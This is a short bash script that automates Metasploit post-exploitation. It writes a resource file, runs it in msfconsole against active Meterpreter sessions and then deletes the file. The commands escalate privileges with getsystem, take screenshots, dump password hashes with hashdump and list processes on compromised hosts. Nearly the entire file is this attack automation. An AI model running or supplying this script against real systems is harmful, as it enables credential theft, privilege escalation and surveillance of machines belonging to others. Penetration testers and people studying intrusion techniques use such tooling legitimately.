#!/bin/bash

# Metasploit Session Post-Exploitation Automation

cat << EOF > /tmp/msf_post.rc
sessions -l

# Run on all active sessions
getsystem
sysinfo
screenshot
hashdump
getuid
ps
EOF

echo "Checking for active Meterpreter sessions and running post-exploitation..."
msfconsole -q -r /tmp/msf_post.rc

rm /tmp/msf_post.rc
